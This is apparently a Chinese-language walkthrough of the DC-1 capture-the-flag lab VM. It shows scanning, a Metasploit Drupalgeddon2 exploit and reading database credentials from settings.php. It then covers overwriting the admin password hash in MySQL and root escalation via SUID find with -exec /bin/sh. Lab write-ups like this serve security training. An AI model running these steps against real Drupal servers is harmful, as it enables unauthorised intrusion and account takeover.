---
title: DC - 1
date: 2023-03-15T14:15:55Z
lastmod: 2023-03-20T19:09:08Z
---

# DC - 1

---

# 一、环境搭建

---

下载靶机文件解压后使用VMware打开，导入靶机后调整网络连接跟攻击机kali相同的模式（我这里是NAT模式）

​![image](assets/image-20230315142355-fu56v06.png)​

---

# 二、通关教程

---

先使用arps-scan扫描内网存在的IP，也就是靶机的IP，使用的命令如下

```bash
arp-scan -l 
```

​![image](assets/image-20230315142726-fygpix3.png)​

由扫描结果可以看到靶机的IP地址为192.168.225.133，接下来使用nmap对靶机进行端口扫描，使用命令如下

```bash
nmap -A -T4 -sS 192.168.255.133
```

扫描结果如下

​![image](assets/image-20230315180452-o0v0nfx.png)​

由于靶机开启了80端口（HTTP服务），所以先使用浏览器访问该服务，在浏览器输入靶机的IP即可成功访问

​![image](assets/image-20230315180952-a2iy0rf.png)​

使用浏览器插件wapplayer对靶机进行CMS识别，结果如下

​![image](assets/image-20230315181055-gny9ha9.png)​

通过识别结果可以得到靶机的CMS为Drupal7，使用metasploit搜说该CMS的相关漏洞，先启动metasploit，命令如下：

```bash
msfconsole
```

​![image](assets/image-20230315181500-r56ksci.png)​

搜索相关漏洞，命令如下

```bash
search Drupal
```

​![image](assets/image-20230315181546-1mmg34b.png)​

这里通过测试发现只有第二个payload可以使用，使用第二个payload对靶机进行渗透，使用命令如下

```bash
use 1
# 或者 use exploit/unix/webapp/drupal_drupalgeddon2 
```

然后进行参数配置，先查看配置参数再进行相关配置，相关命令如下

```bash
show options
set RHOSTS 192.168.225.133
exploit
```

​![image](assets/image-20230315182624-ak0ze34.png)​

​![image](assets/image-20230315182644-zb8nltb.png)​

成功返回shell后查看靶机该目录存在的文件，发现flag1.txt文件，结果如下：

​![image](assets/image-20230315182940-n6l7ez8.png)​

使用python创建一个交互式shell，使用命令如下

```bash
shell #先返回一个简单的shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

​![image](assets/image-20230315183153-goq82ec.png)​

查看该目录下的flag1.txt的内容，结果如下

​![image](assets/image-20230315183351-dwfof5t.png)​

提示我们查看配置文件，通过查询可知该cms的配置文件的目录如下

```bash
 /sites/default/settings.php
```

读取该文件的内容如下

​![image](assets/image-20230315184430-436j5pf.png)​

可以看的成功得到数据库的用户名和密码，登录该数据库，由于前端有登录界面，所以查看用户登录数据有关的数据表即可，使用的命令如下

```bash
mysql -udbuser -pR0ck3t
show databases;
use drupaldb
show tables;
```

​![image](assets/image-20230315185231-6trwavj.png)​

```bash
select * from users\G;
```

​![image](assets/image-20230315185325-p3fay1j.png)​

发现有账号密码，但是密码加盐，爆破和查询都没办法解密。我们换个思路，往里面插入数据修改账号密码（drupal存在加密脚本，找到脚本后利用加密脚本加密）,脚本的目录如下

```bash
/var/www/scripts
```

使用脚本对自己要修改的密码进行加密，使用命令如下

```bash
php scripts/password-hash.sh 123456
```

​![image](assets/image-20230315190027-qh3t9po.png)​

得到加密后的密码， 接着我们登入mysql修改一下admin的密码，使用命令如下

```bash
mysql -udbuser -pR0ck3t
use drupaldb;
update users set pass = "$S$DUnAAngtcGxNZSnVZC8bh5tMCM5i4AhEEkWoRFz6ki5XK8X/dFv7" where name = 'admin';
```

​![image](assets/image-20230315190328-syjfhan.png)​

回到浏览器，使用admin和123456成功登录，在网页上成功找到flag3，如下

​![image](assets/image-20230315190521-fikxqou.png)​

特殊权限将有助于查找密码 - 但您需要 -exec 该命令才能确定如何获取阴影中的内容。flag3中有两个特别的大写字母 perms 和 find ，根据此前 flag 的形式，使用 find / -name "flag*" 搜索所有开头为 flag 的文件。

​![image](assets/image-20230315190902-nfr8fu7.png)​

成功找到 flag4.txt ，使用 cat /home/flag4/flag4.txt 进行查看。

​![image](assets/image-20230315190948-ri82y59.png)​

flag4提示我们要提权，根据flag3 中另外一个大写字母 perms ，猜测可能需要使用 SUID 提权，使用 find / -user root -perm -4000 -print 2>/dev/null 查找所有具有 SUID 权限且属主为 root 的文件。

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

​![image](assets/image-20230315191222-vqp6nse.png)​

find比较常用，可以执行root权限的命令找查文件，

```bash
find / -name index.php -exec "/bin/sh" \;
```

​![image](assets/image-20230315191338-39mqu9x.png)​

​![image](assets/image-20230315191559-ygvnxef.png)​

‍
